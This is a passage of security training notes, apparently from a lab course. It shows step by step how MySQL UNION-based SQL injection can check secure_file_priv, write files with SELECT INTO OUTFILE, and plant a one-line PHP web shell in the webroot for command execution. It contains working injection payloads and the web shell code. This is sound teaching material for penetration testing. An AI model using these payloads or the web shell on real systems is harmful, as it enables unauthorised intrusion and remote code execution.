# 8.15 Writing Files

Writing files from a database to the back-end server is a sensitive and highly restricted feature in modern DBMS systems such as MySQL and MariaDB.

In older or poorly configured systems, attackers could misuse SQL Injection to create files on the server. This could include uploading a malicious script or web shell, which might lead to remote code execution and full server compromise.

Because of this risk, modern database systems usually disable file-writing features by default.

To write files through the database, special permissions are normally required. These permissions are usually granted only to database administrators (DBAs) or trusted high-privilege users.

Before attempting any file write operation during security testing, it is important to verify two things:

* Whether the current database user has enough privileges
* Whether the DBMS configuration allows writing files to disk

If these permissions are missing, the file write operation will fail.

This is why writing files through SQL Injection is much harder on modern systems compared to older database setups.

***

### Write File Privileges <a href="#write-file-privileges" id="write-file-privileges"></a>

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with <mark style="color:$info;">`FILE`</mark> privilege enabled
2. MySQL global <mark style="color:$info;">`secure_file_priv`</mark> variable not enabled
3. Write access to the location we want to write to on the back-end server

We have already found that our current user has the <mark style="color:$info;">`FILE`</mark> privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking the <mark style="color:$info;">`secure_file_priv`</mark> global variable.

**secure\_file\_priv**

The [secure\_file\_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the <mark style="color:$info;">`FILE`</mark> privilege. However, `MySQL` uses <mark style="color:$info;">`/var/lib/mysql-files`</mark> as the default folder. This means that reading files through a `MySQL` injection isn't possible with default settings. Even worse, some modern configurations default to `NULL`, meaning that we cannot read/write files anywhere within the system.

So, let's see how we can find out the value of <mark style="color:$info;">`secure_file_priv`</mark>. Within <mark style="color:$info;">`MySQL`</mark>, we can use the following query to obtain the value of this variable:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

However, as we are using a `UNION` injection, we have to get the value using a <mark style="color:$info;">`SELECT`</mark> statement. This shouldn't be a problem, as all variables and most configurations' are stored within the <mark style="color:$info;">`INFORMATION_SCHEMA`</mark> database. <mark style="color:$info;">`MySQL`</mark> global variables are stored in a table called [global\_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columns <mark style="color:$info;">`variable_name`</mark> and <mark style="color:$info;">`variable_value`</mark>.

We have to select these two columns from that table in the <mark style="color:$info;">`INFORMATION_SCHEMA`</mark> database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the <mark style="color:$info;">`secure_file_priv`</mark> variable, using the <mark style="color:$info;">`WHERE`</mark> clause we learned about in a previous section.

The final SQL query is the following:

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

So, similar to other <mark style="color:$info;">`UNION`</mark> injection queries, we can get the above query result with the following payload. Remember to add two more columns <mark style="color:$info;">`1`</mark> & <mark style="color:$info;">`4`</mark> as junk data to have a total of 4 columns':

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

And the result shows that the <mark style="color:$info;">`secure_file_priv`</mark> value is empty, meaning that we can read/write files to any location.

### SELECT INTO OUTFILE <a href="#select-into-outfile" id="select-into-outfile"></a>

Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the <mark style="color:$info;">`SELECT .. INTO OUTFILE`</mark> statement. The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files. This is usually used for exporting data from tables. \[Like we redirection (>) used in Linux system].

To use it, we can add <mark style="color:$info;">`INTO OUTFILE '...'`</mark> after our query to export the results into the file we specified. The below example saves the output of the `users` table into the <mark style="color:$info;">`/tmp/credentials`</mark> file:

```bash
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

If we go to the back-end server and <mark style="color:$info;">`cat`</mark> the file, we see that table's content:

```bash
SubhaDip03@htb[/htb]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

It is also possible to directly <mark style="color:$info;">`SELECT`</mark> strings into files, allowing us to write arbitrary files to the back-end server.

```bash
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

When we `cat` the file, we see that text:

```bash
SubhaDip03@htb[/htb]$ cat /tmp/test.txt 

this is a test
```

```bash
SubhaDip03@htb[/htb]$ ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

As we can see above, the <mark style="color:$info;">`test.txt`</mark> file was created successfully and is owned by the <mark style="color:$info;">`mysql`</mark> user.

> 💡Tip: Advanced file exports utilize the 'FROM\_BASE64("base64\_data")' function in order to be able to write long/advanced files, including binary data.

### Writing Files through SQL Injection <a href="#writing-files-through-sql-injection" id="writing-files-through-sql-injection"></a>

Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write <mark style="color:$info;">`file written successfully!`</mark> to the <mark style="color:$info;">`/var/www/html/proof.txt`</mark> file, which we can then access on the web application:

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

> Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use <mark style="color:$info;">`load_file`</mark> to read the server configuration, like Apache's configuration found at <mark style="color:$info;">`/etc/apache2/apache2.conf`</mark>, Nginx's configuration at <mark style="color:$info;">`/etc/nginx/nginx.conf`</mark>, or IIS configuration at <mark style="color:$info;">`%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`</mark>, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

The `UNION` injection payload would be as follows:

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

<figure><img src="../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

We don’t see any errors on the page, which indicates that the query succeeded. Checking for the file <mark style="color:$info;">`proof.txt`</mark> in the webroot, we see that it indeed exists:

<figure><img src="../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

> Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.

### Writing a Web Shell <a href="#writing-a-web-shell" id="writing-a-web-shell"></a>

Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:

```php
<?php system($_REQUEST[0]); ?>
```

We can reuse our previous <mark style="color:$info;">`UNION`</mark> injection payload, and change the string to the above, and the file name to <mark style="color:$info;">`shell.php`</mark>:

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

<figure><img src="../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the <mark style="color:$info;">`/shell.php`</mark> file and executing commands via the <mark style="color:$info;">`0`</mark> parameter, with <mark style="color:$info;">`?0=id`</mark> in our URL:

<figure><img src="../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

The output of the <mark style="color:$info;">`id`</mark> command confirms that we have code execution and are running as the <mark style="color:$info;">`www-data`</mark> user.
